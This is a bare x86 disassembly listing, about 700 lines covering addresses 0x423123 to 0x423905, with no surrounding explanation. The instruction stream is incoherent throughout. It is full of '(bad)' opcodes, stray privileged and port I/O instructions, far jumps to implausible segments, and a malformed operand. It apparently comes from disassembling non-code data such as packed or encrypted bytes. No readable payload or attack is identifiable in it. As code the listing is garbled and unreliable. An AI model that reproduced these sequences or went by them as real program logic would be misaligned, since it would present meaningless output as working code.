  423123:	lods   eax,DWORD PTR ds:[esi]
  423124:	add    DWORD PTR [edx],ebx
  423126:	jl     0x423145
  423128:	imul   eax,DWORD PTR [esi+edx*1-0x6],0xffffff94
  42312d:	aam    0xc9
  42312f:	nop
  423130:	pop    ds
  423131:	(bad)  
  423132:	mov    ds:0x94ee0365,al
  423137:	clc    
  423138:	inc    ebx
  423139:	push   ebx
  42313a:	fstp   QWORD PTR [edx+0x478185cd]
  423140:	jnp    0x4230d8
  423142:	xchg   ebx,eax
  423143:	psrlw  mm2,QWORD PTR [ecx*8-0x586028ed]
  42314b:	or     edi,DWORD PTR [eax+ebp*1+0x6229339e]
  423152:	retf   
  423153:	dec    edi
  423154:	lods   al,BYTE PTR ds:[esi]
  423155:	xchg   esp,eax
  423156:	cmp    DWORD PTR [ebp-0x5],0x7d7d49fb
  42315d:	ror    BYTE PTR [ecx],0xf4
  423160:	add    eax,DWORD PTR [ebx-0x6ddb3ef4]
  423166:	push   ebp
  423167:	ret    
  423168:	xchg   ebp,eax
  423169:	js     0x42315c
  42316b:	inc    esp
  42316c:	sti    
  42316d:	dec    esp
  42316e:	mov    ecx,0x32142146
  423173:	in     al,dx
  423174:	jae    0x423119
  423176:	and    ecx,DWORD PTR [edx+0x6865d741]
  42317c:	or     BYTE PTR [ecx+0x1a2849de],ah
  423182:	pop    ecx
  423183:	rcr    dh,0xf0
  423186:	(bad)  
  423187:	or     eax,0x2afb2475
  42318c:	retw   
  42318e:	dec    esp
  42318f:	aam    0x52
  423191:	push   edi
  423192:	in     eax,0x71
  423194:	int    0x32
  423196:	call   0x1d20e597
  42319b:	mov    gs:0x7350280e,eax
  4231a1:	sub    al,0xeb
  4231a3:	data16 clc 
  4231a5:	rcl    DWORD PTR [ebx+0x7197d40a],cl
  4231ab:	pop    es
  4231ac:	mov    ds:0x8d3f2e70,al
  4231b2:	mov    al,ds:0xd0e31f29
  4231b7:	aad    0x1
  4231b9:	retf   
  4231ba:	int    0x75
  4231bc:	mov    dh,0xfa
  4231be:	add    eax,0xd12fcf1f
  4231c3:	sbb    al,0x7a
  4231c5:	arpl   dx,cx
  4231c7:	push   ebp
  4231c8:	and    DWORD PTR [ebx],ebx
  4231ca:	test   cl,dl
  4231cc:	mov    bh,0xff
  4231ce:	sbb    BYTE PTR [esi],bh
  4231d0:	enter  0xfb4b,0x73
  4231d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231d5:	push   edx
  4231d6:	aad    0xa2
  4231d8:	sbb    BYTE PTR [edx+0x4d2662e0],ch
  4231de:	lods   eax,DWORD PTR ds:[esi]
  4231df:	push   esi
  4231e0:	ins    DWORD PTR es:[edi],dx
  4231e1:	or     al,0x12
  4231e3:	adc    ecx,DWORD PTR [ecx+0xdf0adb3]
  4231e9:	jmp    0x4231ae
  4231eb:	inc    ecx
  4231ec:	dec    esp
  4231ed:	adc    eax,0xd469801f
  4231f2:	xchg   esp,eax
  4231f3:	push   ebx
  4231f4:	in     al,0x2a
  4231f6:	stc    
  4231f7:	out    0x2f,al
  4231f9:	stos   BYTE PTR es:[edi],al
  4231fa:	sub    BYTE PTR [ecx],0x54
  4231fd:	rcl    bh,1
  4231ff:	xchg   esi,eax
  423200:	xor    DWORD PTR [eax*2-0x4aec4cd2],esp
  423207:	addr16 mov esi,0xb30633a8
  42320d:	aad    0xf8
  42320f:	xor    bh,cl
  423211:	dec    edx
  423212:	push   0xffffffd6
  423214:	repz cld 
  423216:	push   cs
  423217:	fcmovu st,st(1)
  423219:	adc    eax,DWORD PTR [edi-0x70c2ae36]
  42321f:	mov    eax,0xae924aee
  423224:	mov    ah,0xcf
  423226:	daa    
  423227:	dec    eax
  423228:	enter  0xd822,0x51
  42322c:	imul   ebp,DWORD PTR [ebp-0x66],0xa50b06b4
  423233:	repnz add DWORD PTR [edi],esp
  423236:	xchg   esi,eax
  423237:	dec    esi
  423238:	adc    ch,0x77
  42323b:	cmp    BYTE PTR [esp+ecx*2],cl
  42323e:	(bad)  
  42323f:	test   al,0x44
  423241:	pop    eax
  423242:	pop    esi
  423243:	or     eax,0x2c0390a2
  423248:	js     0x4232a2
  42324a:	arpl   WORD PTR [ebx+esi*8],ax
  42324d:	xor    eax,0x57bcb4b3
  423252:	stos   DWORD PTR es:[edi],eax
  423253:	sbb    al,0x33
  423255:	add    DWORD PTR [edx],0xf99db9e9
  42325b:	push   ebx
  42325c:	into   
  42325d:	inc    ecx
  42325e:	(bad)
  423262:	retf   0x13de
  423265:	aam    0x9e
  423267:	xchg   cl,bh
  423269:	pop    ds
  42326a:	inc    esi
  42326b:	and    DWORD PTR [ebx-0x7b],ebp
  42326e:	test   BYTE PTR ds:0x294bbdbb,dh
  423274:	xchg   ebx,eax
  423275:	mov    eax,0x3a63bedd
  42327a:	sub    bl,BYTE PTR [ebp-0x7b]
  42327d:	push   ecx
  42327e:	mov    eax,0x7279df5c
  423283:	ds xchg ebp,eax
  423285:	mov    ds:0xbf382675,al
  42328a:	add    BYTE PTR [ebx],0xf8
  42328d:	je     0x423215
  42328f:	mov    dh,0x0
  423291:	inc    ecx
  423292:	ficom  DWORD PTR [eax+0x3802f0f]
  423298:	test   BYTE PTR [ebx+eax*8],ch
  42329b:	and    al,BYTE PTR [edx-0x6c]
  42329e:	cmc    
  42329f:	and    BYTE PTR [edi],bh
  4232a1:	xchg   ecx,eax
  4232a2:	inc    esp
  4232a3:	push   edx
  4232a4:	jecxz  0x42330a
  4232a6:	iret   
  4232a7:	(bad)  
  4232a9:	xchg   ecx,eax
  4232aa:	shl    BYTE PTR [edi-0x67],0x77
  4232ae:	jecxz  0x4232a7
  4232b0:	sbb    eax,0x7f54b411
  4232b5:	bound  edi,QWORD PTR [eax-0x2fbab2c]
  4232bb:	dec    esp
  4232bc:	or     DWORD PTR [ecx],ebx
  4232be:	arpl   WORD PTR [edx-0x1e6f557d],cx
  4232c4:	xor    eax,0x1475ea3d
  4232c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232ca:	mov    dl,0x9
  4232cc:	call   0x1197c2cf
  4232d1:	fst    DWORD PTR [eax+esi*8]
  4232d4:	jmp    0x1dbc:0x38efb799
  4232db:	test   BYTE PTR [ecx+0x6beab52f],bl
  4232e1:	push   ss
  4232e2:	not    BYTE PTR ds:0xcad3c664
  4232e8:	cdq    
  4232e9:	fmul   QWORD PTR ds:0xec1011b
  4232ef:	test   BYTE PTR [esi-0x19],ch
  4232f2:	sbb    al,0x8f
  4232f4:	sub    bh,BYTE PTR [edi]
  4232f6:	iret   
  4232f7:	jnp    0x423319
  4232f9:	mov    BYTE PTR [ebx+0x40],al
  4232fc:	push   ss
  4232fd:	mov    ds:0x17844a2,al
  423302:	cs jmp esp
  423305:	(bad)  
  423307:	inc    edx
  423308:	fwait
  423309:	jns    0x423300
  42330b:	sub    eax,0x3ef56e37
  423310:	or     bl,ah
  423312:	jo     0x4232f0
  423314:	or     BYTE PTR [eax-0x42aa309f],al
  42331a:	mov    ds:0xbe456d8f,al
  42331f:	dec    ecx
  423320:	sbb    dh,BYTE PTR [ecx-0x66]
  423323:	jmp    0x4ea2:0x2865ed3f
  42332a:	dec    ebx
  42332b:	cmp    edi,DWORD PTR [edi-0x770e8971]
  423331:	cs sbb eax,0x6c3a0478
  423337:	dec    esp
  423338:	fisub  WORD PTR [ebx+0x22]
  42333b:	sub    al,0xb7
  42333d:	scas   eax,DWORD PTR es:[di]
  42333f:	push   ds
  423340:	jb     0x4232d4
  423342:	fisubr DWORD PTR [eax]
  423344:	in     al,0xa7
  423346:	pop    eax
  423347:	fild   DWORD PTR [ebx]
  423349:	mov    ecx,db0
  42334c:	ins    DWORD PTR es:[edi],dx
  42334d:	jecxz  0x42333b
  42334f:	cmp    edi,ecx
  423351:	mov    al,0xd0
  423353:	xor    esp,DWORD PTR [esi+0x4]
  423356:	fs xchg ecx,eax
  423358:	lock outs dx,DWORD PTR ds:[esi]
  42335a:	mov    esi,0x97841fb
  42335f:	clc    
  423360:	inc    ebp
  423361:	fnstsw WORD PTR [edx]
  423363:	or     eax,0xd650141b
  423368:	dec    esp
  423369:	cmp    BYTE PTR [edx+0x7b],cl
  42336c:	adc    BYTE PTR [eax],ah
  42336e:	dec    ebp
  42336f:	sbb    DWORD PTR [ebx+0x51f77f48],edi
  423375:	add    al,cl
  423377:	sub    BYTE PTR [ecx],0xcd
  42337a:	jecxz  0x42338f
  42337c:	int3   
  42337d:	push   0x478ea7
  423382:	add    ebp,DWORD PTR [ebp-0x777d07df]
  423388:	in     al,0x50
  42338a:	sbb    BYTE PTR ds:0x1f2d306e,ch
  423390:	xlat   BYTE PTR ds:[ebx]
  423391:	inc    esp
  423392:	retf   
  423393:	fnstenv [edx]
  423395:	div    BYTE PTR [eax+0x4dbdc090]
  42339b:	mov    dh,0x17
  42339d:	pop    es
  42339e:	ins    BYTE PTR es:[edi],dx
  42339f:	inc    edi
  4233a0:	jge    0x423383
  4233a2:	mov    dh,0xc0
  4233a4:	(bad)  
  4233a6:	sub    esi,esp
  4233a8:	int    0x5e
  4233aa:	mov    ebx,0x526a9d19
  4233af:	int3   
  4233b0:	or     ch,dl
  4233b2:	pop    ebp
  4233b3:	ret    0x4ce0
  4233b6:	and    BYTE PTR [edx],0xa2
  4233b9:	push   edi
  4233ba:	fbstp  TBYTE PTR [edi+ebp*4+0xe]
  4233be:	push   ds
  4233bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4233c0:	xchg   DWORD PTR [edi+edi*2+0x7c],esp
  4233c4:	jno    0x42336c
  4233c6:	mov    al,ds:0xd2e97914
  4233cb:	dec    ecx
  4233cc:	push   ebp
  4233cd:	or     eax,0x11139bac
  4233d2:	stc    
  4233d3:	jmp    DWORD PTR [ebx]
  4233d6:	mov    ebx,0x1cf578d4
  4233db:	xor    BYTE PTR [ebp+0x40],ah
  4233de:	ss pop edi
  4233e0:	dec    edx
  4233e1:	xor    eax,0x3bf39419
  4233e6:	push   ebx
  4233e7:	add    ebp,ebx
  4233e9:	pop    ebx
  4233ea:	xchg   edx,eax
  4233eb:	leave  
  4233ec:	push   edi
  4233ed:	dec    ebx
  4233ee:	mov    ds:0x4854bd7d,eax
  4233f3:	cmp    eax,0x8f5d0007
  4233f8:	pop    ecx
  4233f9:	jg     0x423465
  4233fb:	cli    
  4233fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233fd:	pop    esi
  4233fe:	pop    es
  4233ff:	xchg   ebp,eax
  423400:	pop    eax
  423401:	stos   DWORD PTR es:[edi],eax
  423402:	ret    
  423403:	call   0x94b8f5a7
  423408:	fistp  QWORD PTR [eax-0x26]
  42340b:	nop
  42340c:	and    ebx,DWORD PTR [ebp-0x7d240e83]
  423412:	xlat   BYTE PTR ds:[ebx]
  423413:	lods   eax,DWORD PTR ds:[esi]
  423414:	mov    DWORD PTR [esi+0x3866ff03],edx
  42341a:	in     eax,dx
  42341b:	xor    DWORD PTR [eax+0x57],0xfffffffd
  42341f:	push   eax
  423420:	mov    ecx,0xd153daf7
  423425:	ror    BYTE PTR [esi+0x17],1
  423428:	pop    ebx
  423429:	inc    eax
  42342a:	xchg   esi,eax
  42342b:	xor    BYTE PTR [eax+0x36],ch
  42342e:	imul   BYTE PTR es:[esi+esi*1-0x6c]
  423433:	icebp  
  423434:	xchg   esp,eax
  423435:	dec    edi
  423436:	pop    ebx
  423437:	push   edx
  423438:	leave  
  423439:	xchg   ebx,eax
  42343a:	push   es
  42343b:	or     esp,DWORD PTR [eax-0x56]
  42343e:	iret   
  42343f:	mov    cl,0x5a
  423441:	push   ss
  423442:	cmp    eax,0x71cd665b
  423447:	inc    ebp
  423448:	jmp    0x49e:0xbb9c302f
  42344f:	jg     0x423442
  423451:	cdq    
  423452:	sub    bh,BYTE PTR [eax]
  423454:	sub    eax,0xc034fb5a
  423459:	cmp    DWORD PTR [ebx-0x35],ebp
  42345c:	addr16 das 
  42345e:	aam    0x73
  423460:	fiadd  DWORD PTR [ecx-0x78]
  423463:	push   esi
  423464:	push   0x89882370
  423469:	scas   al,BYTE PTR es:[edi]
  42346a:	jg     0x4233f0
  42346c:	pop    ss
  42346d:	into   
  42346e:	aas    
  42346f:	inc    ebp
  423470:	pop    ds
  423471:	(bad)  
  423472:	jg     0x4234b5
  423474:	aad    0xf
  423476:	push   es
  423477:	jl     0x42344a
  423479:	mov    cl,BYTE PTR [ebp-0x61]
  42347c:	aam    0xbc
  42347e:	rol    DWORD PTR [eax+0x8],cl
  423481:	ficomp WORD PTR [esi+0x62]
  423484:	retf   0x87f2
  423487:	in     eax,0xcd
  423489:	ins    BYTE PTR es:[edi],dx
  42348a:	popf   
  42348b:	xchg   esp,eax
  42348c:	fistp  DWORD PTR [ebx+ebx*8]
  42348f:	pop    es
  423490:	inc    eax
  423491:	lods   al,BYTE PTR ds:[esi]
  423492:	out    dx,eax
  423493:	ja     0x423484
  423495:	push   ebp
  423496:	mov    ds,esp
  423498:	fdivrp st(0),st
  42349a:	mov    al,0x18
  42349c:	lea    edi,[esi-0x9]
  42349f:	and    ecx,DWORD PTR [edi-0x80]
  4234a2:	test   eax,0x7c15e8d6
  4234a7:	or     eax,0x33bf4fef
  4234ac:	push   esp
  4234ad:	jmp    0x4701e4d2
  4234b2:	loop   0x423520
  4234b4:	lock mov cl,0x1
  4234b7:	(bad)  
  4234b8:	mov    ecx,0xfe769ffb
  4234bd:	mov    ch,BYTE PTR [ebp+0x7b]
  4234c0:	psubb  mm4,QWORD PTR [edi+0x29418af5]
  4234c7:	pop    ebx
  4234c8:	mov    dh,0x1b
  4234ca:	pop    ecx
  4234cb:	ror    DWORD PTR [esi+0x71cd153f],1
  4234d1:	arpl   bp,dx
  4234d3:	xchg   DWORD PTR [ecx+0x5e9ce6c0],edi
  4234d9:	sbb    al,0x5a
  4234db:	or     al,0x34
  4234dd:	cmp    ecx,DWORD PTR [eax+0x481d407c]
  4234e3:	adc    ch,bh
  4234e5:	jecxz  0x4234fb
  4234e7:	adc    edx,DWORD PTR [ebp-0x61]
  4234ea:	(bad)  
  4234eb:	or     BYTE PTR [edx+0x14c4bf29],ch
  4234f1:	mov    dl,0x67
  4234f3:	cli    
  4234f4:	inc    BYTE PTR [ebx+0x45]
  4234f7:	rcr    ah,1
  4234f9:	add    BYTE PTR [esi],al
  4234fb:	rol    BYTE PTR [ebp-0x19d1a9f2],1
  423501:	nop
  423502:	popf   
  423503:	sahf   
  423504:	nop
  423505:	inc    ebx
  423506:	push   eax
  423507:	cmp    DWORD PTR [ecx+0x9],ecx
  42350a:	aaa    
  42350b:	push   esi
  42350c:	pop    edi
  42350d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42350e:	sar    DWORD PTR [edi+0x7f],0xde
  423512:	jg     0x423541
  423514:	ficom  WORD PTR [ecx]
  423516:	retf   0xadc5
  423519:	pushf  
  42351a:	pop    esp
  42351b:	ret    
  42351c:	jp     0x4234c5
  42351e:	inc    ebp
  42351f:	stos   DWORD PTR es:[edi],eax
  423520:	xor    bh,BYTE PTR [ebp+0x6a396676]
  423526:	in     al,0x99
  423528:	adc    BYTE PTR [ebx],bh
  42352a:	mov    al,ds:0xdc818f4e
  42352f:	fbld   TBYTE PTR [esi+0x57]
  423532:	mov    cl,0x19
  423534:	add    ebx,DWORD PTR [edx+0x61]
  423537:	mov    dh,0x7d
  423539:	sbb    BYTE PTR [esi-0x6c],ch
  42353c:	popf   
  42353d:	sub    DWORD PTR [edi-0x450413f7],ecx
  423543:	pop    edi
  423544:	sub    ecx,DWORD PTR [esi]
  423546:	(bad)  
  423547:	fcmovb st,st(3)
  423549:	shl    DWORD PTR [ebx],1
  42354b:	xor    eax,0xbf86b1e7
  423550:	fs aas 
  423552:	jne    0x423572
  423554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423555:	push   ds
  423556:	iret   
  423557:	jl     0x42351c
  423559:	clc    
  42355a:	xor    al,0x75
  42355c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42355d:	mov    esp,0x86db79b7
  423562:	inc    esp
  423563:	(bad)  
  423564:	fcom   DWORD PTR ds:0x128ae5c7
  42356a:	lock sbb edx,DWORD PTR [ebx+ebx*4]
  42356e:	cs xchg ecx,eax
  423570:	jmp    0x7896:0x67f4f8e
  423577:	(bad)  
  423578:	cmp    eax,0x48331b84
  42357d:	inc    esp
  42357e:	sub    DWORD PTR [eax],edi
  423580:	mov    cl,0x37
  423582:	icebp  
  423583:	or     al,bl
  423585:	jbe    0x4235e2
  423587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423588:	sub    ah,BYTE PTR [edx]
  42358a:	mov    fs,WORD PTR [eax+0x50]
  42358d:	mov    cl,bl
  42358f:	or     al,0x4e
  423591:	pusha  
  423592:	dec    esp
  423593:	shr    edx,cl
  423595:	(bad)  
  423597:	int3   
  423598:	cmp    BYTE PTR [esi-0x7ddcea7d],al
  42359e:	pop    ecx
  42359f:	xor    edx,0x31e51878
  4235a5:	adc    ebx,ecx
  4235a7:	imul   di,WORD PTR [ecx-0x7f],0xdf8
  4235ad:	sahf   
  4235ae:	das    
  4235af:	call   0x1664:0x90f0dcf9
  4235b6:	mov    al,ds:0x999f6d17
  4235bb:	in     eax,dx
  4235bc:	xchg   ecx,eax
  4235bd:	add    ebx,0xffffff8e
  4235c0:	inc    eax
  4235c1:	(bad)  
  4235c2:	add    al,0xab
  4235c4:	jge    0x4235b8
  4235c6:	mov    ds:0x19df960d,al
  4235cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235cc:	cmp    al,BYTE PTR [edi]
  4235ce:	addr16 jge 0x4235dd
  4235d1:	sbb    esi,DWORD PTR [ecx-0x6b33ab07]
  4235d7:	inc    ebp
  4235d8:	xor    DWORD PTR [edx],ebp
  4235da:	mov    cl,0x61
  4235dc:	mov    al,0x13
  4235de:	adc    al,0x10
  4235e0:	xor    BYTE PTR [eax+esi*8],bh
  4235e3:	cmp    dl,BYTE PTR ds:0x9ca069f6
  4235e9:	push   ss
  4235ea:	push   0x7eea8e34
  4235ef:	mov    bh,0x2
  4235f1:	inc    edx
  4235f2:	mov    esp,0x3e78e4b3
  4235f7:	lods   eax,DWORD PTR ds:[esi]
  4235f8:	mov    ebp,0x289e1abb
  4235fd:	fcomp  DWORD PTR [ebp*2+0x1bec35db]
  423604:	pop    DWORD PTR [ebp-0x4d]
  423607:	dec    eax
  423608:	arpl   WORD PTR [ecx+0x3a63c97d],di
  42360e:	idiv   DWORD PTR [eax]
  423610:	ficomp DWORD PTR [eax-0x61157fdd]
  423616:	dec    edi
  423617:	mov    ah,0x9f
  423619:	int3   
  42361a:	lods   al,BYTE PTR ds:[esi]
  42361b:	ror    BYTE PTR [ebp+0xf],cl
  42361e:	jecxz  0x423631
  423620:	pop    ecx
  423621:	jno    0x42364c
  423623:	sbb    DWORD PTR [edx],esp
  423625:	aam    0xcf
  423627:	cmp    al,0x51
  423629:	sahf   
  42362a:	(bad)  
  42362b:	sub    BYTE PTR [ebx+0x3e],dl
  42362e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42362f:	push   0x6d7d1dfd
  423634:	push   0xffffff8a
  423636:	loop   0x4235e9
  423638:	scas   al,BYTE PTR es:[edi]
  423639:	inc    esi
  42363a:	push   ax
  42363c:	aaa    
  42363d:	ss leave 
  42363f:	xlat   BYTE PTR ds:[ebx]
  423640:	mov    cl,0x70
  423642:	fild   DWORD PTR [edx-0x80]
  423645:	jbe    0x423654
  423647:	(bad)  
  423648:	adc    BYTE PTR [esi+0x3b],bl
  42364b:	ins    BYTE PTR es:[edi],dx
  42364c:	pop    ss
  42364d:	aam    0x7c
  42364f:	add    DWORD PTR [esi+0x7507d282],esp
  423655:	push   ebp
  423656:	xchg   edx,eax
  423657:	(bad)  
  423658:	mov    ebp,0xd61126f6
  42365d:	nop
  42365e:	lock outs dx,BYTE PTR ds:[esi]
  423660:	(bad)  
  423661:	pop    ebp
  423662:	les    ecx,FWORD PTR [esi+eax*8+0x31b268ab]
  423669:	enter  0x8185,0xaf
  42366d:	fbld   TBYTE PTR [edx+0x15]
  423670:	imul   ecx,DWORD PTR [eax-0x1d],0x34
  423674:	in     al,0x40
  423676:	push   esi
  423677:	fidivr DWORD PTR [edi-0x16c88790]
  42367d:	idiv   BYTE PTR [edx-0x69aa0fc]
  423683:	xchg   ebp,eax
  423684:	add    BYTE PTR [eax],al
  423686:	add    BYTE PTR [eax],al
  423688:	add    BYTE PTR [eax],al
  42368a:	pop    eax
  42368b:	pop    ecx
  42368c:	dec    ebx
  42368d:	push   ebp
  42368e:	dec    ebx
  42368f:	push   edi
  423690:	pop    esi
  423691:	pop    ebp
  423692:	mov    ebx,0xdba42923
  423697:	ret    
  423698:	jg     0x4236b9
  42369a:	out    0xc4,al
  42369c:	add    DWORD PTR [eax],eax
  42369e:	add    BYTE PTR [esi],0x0
  4236a1:	add    cl,ch
  4236a3:	and    al,0xe7
  4236a5:	pop    edx
  4236a6:	shl    BYTE PTR ds:0x9582f5e0,1
  4236ac:	cmp    eax,DWORD PTR [esi+0x54877c8b]
  4236b2:	dec    edx
  4236b3:	inc    edx
  4236b4:	mov    edx,0xdd2f3f
  4236b9:	cmp    dh,BYTE PTR [eax-0x51bf055f]
  4236bf:	jmp    DWORD PTR ds:0x9313e5fa
  4236c5:	sbb    DWORD PTR [ebx],ebx
  4236c7:	std    
  4236c8:	push   0xffffff81
  4236ca:	ss test eax,0x26996417
  4236d0:	outs   dx,BYTE PTR ds:[esi]
  4236d1:	xor    cl,0x33
  4236d4:	loop   0x423708
  4236d6:	xchg   BYTE PTR [esi-0x69],bl
  4236d9:	inc    ebx
  4236da:	xchg   ebx,eax
  4236db:	ret    0xc279
  4236de:	das    
  4236df:	and    BYTE PTR [eax-0x11c33e96],bl
  4236e5:	jne    0x423700
  4236e7:	cmp    al,0x76
  4236e9:	xor    BYTE PTR [ebx-0x25],bl
  4236ec:	dec    ebx
  4236ed:	and    al,0xc4
  4236ef:	pop    ds
  4236f0:	mov    ds:0x15edfb8b,al
  4236f5:	scas   al,BYTE PTR es:[edi]
  4236f6:	inc    ecx
  4236f7:	jg     0x423745
  4236f9:	sub    dl,al
  4236fb:	cwde   
  4236fc:	sbb    esp,ebx
  4236fe:	dec    edx
  4236ff:	add    esi,ebp
  423701:	dec    esp
  423702:	(bad)  
  423703:	hlt    
  423704:	stc    
  423705:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423706:	pusha  
  423707:	enter  0xe2bf,0x67
  42370b:	fbstp  TBYTE PTR [esi+0x52]
  42370e:	sub    BYTE PTR [esi],ch
  423710:	and    DWORD PTR [ecx+0x5dad3af9],eax
  423716:	jo     0x42378d
  423718:	dec    edi
  423719:	sbb    al,0x25
  42371b:	pop    ss
  42371c:	call   0x8e8d:0x59bca71
  423723:	sbb    BYTE PTR [ebx],dl
  423725:	sub    BYTE PTR [edi+0x63fb4029],dl
  42372b:	mov    ds:0xaf219e17,eax
  423730:	ret    0x873b
  423733:	ficomp DWORD PTR [ebp-0x12cbec5d]
  423739:	arpl   WORD PTR [edx],bp
  42373b:	dec    ebp
  42373c:	out    0xc9,al
  42373e:	fdiv   DWORD PTR [esp+ebp*4-0x1b]
  423742:	rcl    BYTE PTR [ecx+0x1e23acce],0xdb
  423749:	mov    bh,0x66
  42374b:	into   
  42374c:	xor    ah,BYTE PTR [edi+0xf]
  42374f:	jae    0x4236fa
  423751:	jnp    0x423732
  423753:	inc    eax
  423754:	mov    ?,WORD PTR [eax+0x3af65ba]
  42375a:	add    DWORD PTR [edx*1-0x4d63e372],0x9d97a26a
  423765:	xchg   ebx,eax
  423766:	aad    0xf5
  423768:	cmp    eax,0x6c369384
  42376d:	add    ebp,DWORD PTR [edi+0x1a2907b2]
  423773:	scas   al,BYTE PTR es:[edi]
  423774:	adc    eax,0x466d34f4
  423779:	jmp    0x42378f
  42377b:	xchg   edx,eax
  42377c:	xchg   edx,eax
  42377d:	jmp    0x4237b3
  42377f:	outs   dx,DWORD PTR ds:[esi]
  423780:	int3   
  423781:	idiv   dh
  423783:	loop   0x423786
  423785:	push   edi
  423786:	sub    ah,BYTE PTR [ecx-0x273c5b88]
  42378c:	scas   eax,DWORD PTR es:[edi]
  42378d:	mov    es,WORD PTR [eax]
  42378f:	gs sub eax,0x43528756
  423795:	pop    edi
  423797:	jl     0x423750
  423799:	push   edx
  42379a:	xor    eax,0x7e3dff55
  42379f:	ja     0x423736
  4237a1:	(bad)  
  4237a2:	shl    BYTE PTR [esi],cl
  4237a4:	mov    ecx,0xc9726c37
  4237a9:	push   edx
  4237aa:	imul   edx,DWORD PTR [ebx+edi*4],0xab445da6
  4237b1:	pop    ecx
  4237b2:	test   al,0xaf
  4237b4:	repz shl DWORD PTR [edi+0x4a120c6d],1
  4237bb:	outs   dx,DWORD PTR ds:[esi]
  4237bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237bd:	pop    ebx
  4237be:	mov    bl,0xe7
  4237c0:	(bad)  [ebx+0x14f10a77]
  4237c6:	mov    ecx,edi
  4237c8:	(bad)  
  4237c9:	imul   edi,DWORD PTR [ecx+0x4],0xffffffef
  4237cd:	jb     0x4237e0
  4237cf:	test   DWORD PTR [esi],0x9f083ecc
  4237d5:	push   es
  4237d6:	cmp    cl,BYTE PTR [ecx-0x10]
  4237d9:	mov    WORD PTR [eax+0x4aaa73f0],cs
  4237df:	repnz popf 
  4237e1:	lea    edx,[ebp-0x3fd2ac40]
  4237e7:	inc    esp
  4237e8:	dec    eax
  4237e9:	xchg   BYTE PTR [edi-0x680488f5],dl
  4237ef:	jns    0x42378f
  4237f1:	mov    edx,0x1a629a10
  4237f6:	pop    edi
  4237f7:	xchg   ecx,eax
  4237f8:	mov    bl,0x4c
  4237fa:	iret   
  4237fb:	xor    eax,0x472c9657
  423800:	das    
  423801:	inc    esp
  423802:	fist   DWORD PTR [ecx]
  423804:	daa    
  423805:	adc    al,BYTE PTR [eax]
  423807:	xor    DWORD PTR [ebx+0x1fe7571c],esi
  42380d:	out    dx,eax
  42380e:	dec    ebx
  42380f:	add    ebx,ecx
  423811:	test   eax,0x7ef82d9
  423816:	and    eax,0x3bcdd4f6
  42381b:	push   esp
  42381c:	cmp    edx,DWORD PTR [ebx+0x5058527f]
  423822:	push   ebp
  423823:	js     0x42381b
  423825:	(bad)  
  423826:	(bad)  
  423827:	xor    ecx,edx
  423829:	enter  0x1094,0xf0
  42382d:	test   BYTE PTR [ebx],bh
  42382f:	xor    BYTE PTR [eax],cl
  423831:	push   cs
  423832:	ds pushf 
  423834:	retf   0x4ce3
  423837:	push   ecx
  423838:	in     eax,dx
  423839:	repz repz inc eax
  42383c:	fadd   DWORD PTR [ebx+0x65]
  42383f:	pop    ebp
  423840:	cmc    
  423841:	gs in  eax,dx
  423843:	add    DWORD PTR [eax-0x69281c0f],esp
  423849:	xor    al,0x4a
  42384b:	xchg   ecx,eax
  42384c:	jmp    0x11c1e79e
  423851:	jae    0x4237df
  423853:	fild   WORD PTR [bx]
  423856:	pusha  
  423857:	mov    bh,0xc1
  423859:	push   ds
  42385a:	adc    eax,0x2f06cfc8
  42385f:	push   ecx
  423860:	into   
  423861:	mov    esp,0x99718551
  423866:	std    
  423867:	fdivr  DWORD PTR [edi-0x80]
  42386a:	dec    edi
  42386b:	stos   BYTE PTR es:[edi],al
  42386c:	adc    al,0x3c
  42386e:	cmc    
  42386f:	mov    al,ds:0x4755954f
  423874:	idiv   DWORD PTR [esi-0xf]
  423877:	nop
  423878:	clc    
  423879:	cmp    al,dh
  42387b:	js     0x4238b9
  42387d:	int    0x5c
  42387f:	push   cs
  423880:	mov    bl,ah
  423882:	mov    ch,0x7f
  423884:	inc    ebx
  423885:	js     0x42384e
  423887:	mov    DWORD PTR [esi+0x71fbb418],ebp
  42388d:	test   eax,0x909996a6
  423892:	imul   ebx,DWORD PTR [edx+0x5cd1aceb],0x34d64f11
  42389c:	inc    edx
  42389d:	inc    esp
  42389e:	int3   
  42389f:	and    ebx,DWORD PTR [ebx-0xd811e85]
  4238a5:	cmp    BYTE PTR [edx],cl
  4238a7:	stos   DWORD PTR es:[edi],eax
  4238a8:	sbb    eax,0xe36e826b
  4238ad:	and    BYTE PTR [ecx-0x35e284ae],ah
  4238b3:	cmp    BYTE PTR [edi+0x53],al
  4238b6:	jmp    0x3e10:0x8727f22a
  4238bd:	jmp    0x42386c
  4238bf:	loope  0x4238f7
  4238c1:	jno    0x42391e
  4238c3:	jbe    0x42391e
  4238c5:	mov    edi,0xaed4820f
  4238ca:	push   ecx
  4238cb:	push   edx
  4238cc:	push   ss
  4238cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238ce:	outs   dx,BYTE PTR ds:[esi]
  4238cf:	xor    eax,DWORD PTR [edi+0x3f]
  4238d2:	add    DWORD PTR [esi-0x48],0x9c2d7f86
  4238d9:	bound  ebp,QWORD PTR [ecx+ebp*4+0x18db9ac1]
  4238e0:	cmp    dl,BYTE PTR [esi+0x15]
  4238e3:	pop    ecx
  4238e4:	repnz mov bl,0x8c
  4238e7:	sub    al,dh
  4238e9:	mov    ecx,0x385e835c
  4238ee:	fcomp  st(2)
  4238f0:	arpl   si,ax
  4238f2:	push   ebx
  4238f3:	sbb    cl,ah
  4238f5:	les    ecx,FWORD PTR [ebx+0x1]
  4238f8:	les    ebx,FWORD PTR [eax]
  4238fa:	dec    eax
  4238fb:	jb     0x423962
  4238fd:	xchg   esp,eax
  4238fe:	pop    edx
  4238ff:	lds    esp,FWORD PTR [edi+0x2c6931f]
  423905:	retf   
